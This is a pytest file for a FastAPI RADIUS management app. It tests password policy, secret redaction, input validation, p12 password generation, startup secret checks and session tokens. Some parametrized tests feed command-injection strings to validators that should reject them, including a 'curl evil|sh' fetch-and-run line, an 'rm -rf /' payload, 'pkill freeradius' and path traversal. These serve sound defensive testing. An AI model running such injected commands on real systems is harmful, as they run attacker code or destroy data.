"""Guards for the critical GitHub-issue fixes (#2-#5) and core pure functions.

Runs without a database: DB access is stubbed where needed.
"""
import inspect
import os
import re
import sys

import pytest
from fastapi import HTTPException

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "api"))

import app


@pytest.fixture(autouse=True)
def no_db(monkeypatch):
    def _boom(*a, **k):
        raise RuntimeError("no DB in unit tests")

    monkeypatch.setattr(app, "get_db_connection", _boom)
    yield


# --- password policy / generation -------------------------------------------

def test_password_policy_rejects_weak():
    for bad in ["short1A!", "alllowercase123!", "ALLUPPER123!", "NoDigitsHere!!", "NoSymbol12345"]:
        with pytest.raises(HTTPException):
            app.validate_password_policy(bad, "someuser")


def test_password_policy_accepts_strong():
    app.validate_password_policy("Str0ng!Passw0rd#42", "someuser")


def test_password_policy_rejects_username_equal():
    with pytest.raises(HTTPException):
        app.validate_password_policy("Rajesh123!!", "rajesh123!!")


def test_generated_password_meets_policy_and_varies():
    pw1 = app.generate_secure_password(16)
    pw2 = app.generate_secure_password(16)
    assert len(pw1) == 16
    assert pw1 != pw2
    app.validate_password_policy(pw1, "x")
    info = app.password_strength(pw1)
    assert info["strength"] in ("fair", "good", "strong")


def test_redact_masks_nested_secrets():
    payload = {"user": "raj", "password": "s3cret", "nested": {"p12_bundle": "abc", "ok": 1}}
    out = app.redact(payload)
    assert out["password"] == "***REDACTED***"
    assert out["nested"]["p12_bundle"] == "***REDACTED***"
    assert out["nested"]["ok"] == 1
    assert out["user"] == "raj"


# --- input validators (issue #2: injection must 422) -------------------------

@pytest.mark.parametrize("bad", ['a"; id; echo "', "../../etc", "", "a/b", "x'; curl evil|sh; echo '"])
def test_username_rejects_injection(bad):
    with pytest.raises(HTTPException) as ei:
        app.validate_username(bad)
    assert ei.value.status_code == 422


def test_username_accepts_normal():
    assert app.validate_username("rajesh.kumar-01") == "rajesh.kumar-01"


@pytest.mark.parametrize("bad", ["1.2.3.4; id", "1.2.3.4; pkill freeradius", "not-an-ip", ""])
def test_nas_ip_rejects_injection(bad):
    with pytest.raises(HTTPException) as ei:
        app.validate_nas_ip(bad)
    assert ei.value.status_code == 422


@pytest.mark.parametrize("good", ["192.168.1.10", "10.10.0.12", "::1"])
def test_nas_ip_accepts_real_addresses(good):
    assert app.validate_nas_ip(good) == good


def test_acct_session_id_rejects_injection():
    with pytest.raises(HTTPException):
        app.validate_acct_session_id('a"; rm -rf /; echo "')
    assert app.validate_acct_session_id("ABCDEF123:789") == "ABCDEF123:789"


def test_no_shell_true_in_codebase():
    src = open(os.path.join(os.path.dirname(app.__file__), "app.py"), encoding="utf-8").read()
    assert "shell=True" not in src.replace("no shell=True anywhere", "")


def test_disconnect_uses_safe_helper():
    src = inspect.getsource(app.disconnect_session)
    assert "send_coa_disconnect" in src
    assert "shell" not in src


# --- p12 passwords (issue #3) -------------------------------------------------

def test_p12_passwords_are_random_and_unqualified():
    p1, p2 = app.generate_p12_password(), app.generate_p12_password()
    assert len(p1) >= 12 and p1 != p2
    assert "whatever" not in (p1 + p2).lower()


def test_no_well_known_p12_default_in_models():
    for model in (app.IssueCertRequest, app.PortalEnrollCertRequest, app.CertLoginRequest):
        for name, field in model.model_fields.items():
            if "password" in name:
                assert field.default != "whatever", f"{model.__name__}.{name}"


def test_no_static_secret_in_shipped_static_files():
    static = os.path.join(os.path.dirname(app.__file__), "static")
    for fname in os.listdir(static):
        if not fname.endswith((".html", ".js")):
            continue
        text = open(os.path.join(static, fname), encoding="utf-8").read()
        assert "RadSec_9921" not in text, fname
        assert "whatever" not in text.lower(), fname
        assert not re.search(r"secret:\s*['\"][^'\"]+['\"]", text), fname


# --- startup secrets (issue #5) ------------------------------------------------

def test_startup_refuses_published_defaults(monkeypatch):
    monkeypatch.setattr(app, "SESSION_SECRET", "change_this_session_secret_in_production_32_chars!")
    monkeypatch.setattr(app, "ADMIN_FALLBACK_PASS", "admin123")
    monkeypatch.setattr(app, "RADIUS_SECRET", "testing123")
    with pytest.raises(RuntimeError):
        app.check_startup_secrets()


def test_startup_accepts_strong_secrets(monkeypatch):
    monkeypatch.setattr(app, "SESSION_SECRET", "a" * 40)
    monkeypatch.setattr(app, "ADMIN_FALLBACK_PASS", "sTr0ng!uniq-Adm1n#pw")
    monkeypatch.setattr(app, "RADIUS_SECRET", "another-strong-secret-99")
    app.check_startup_secrets()  # must not raise


# --- session tokens ------------------------------------------------------------

def test_token_roundtrip_and_tamper_rejected(monkeypatch):
    monkeypatch.setattr(app, "SESSION_SECRET", "b" * 40)
    token = app.generate_session_token("raj")
    assert app.verify_session_token(token) == "raj"
    assert app.verify_session_token(token + "tampered") is None
    assert app.verify_session_token("garbage") is None


# --- glossary / explanations ----------------------------------------------------

def test_glossary_lookup_case_insensitive():
    assert "10.10.0.12" in app.glossary_lookup("Framed-IP-Address")
    assert app.glossary_lookup("FRAMED-IP-ADDRESS") == app.glossary_lookup("framed-ip-address")


def test_explain_attribute_value_aware():
    text = app.explain_attribute("Framed-IP-Address", "10.10.0.12")
    assert "Framed-IP-Address = 10.10.0.12" in text


# --- route registration smoke test ----------------------------------------------

def test_critical_routes_registered():
    paths = set()
    for route in app.app.routes:
        p = getattr(route, "path", "")
        if p:
            paths.add(p)
    for needed in (
        "/radius/api/glossary",
        "/radius/api/sessions/disconnect",
        "/radius/api/portal/download-cert",
        "/radius/api/portal/download-mobileconfig",
        "/radius/api/certs/orphans",
        "/radius/api/accounting",
    ):
        assert needed in paths, needed


def test_accounting_limit_is_clamped():
    src = inspect.getsource(app.get_accounting)
    assert "min(max(int(limit" in src and ", 500)" in src
    # clamp assignment must come before the value reaches SQL params
    assert src.index("min(max(int(limit") < src.index("params.append(limit)")
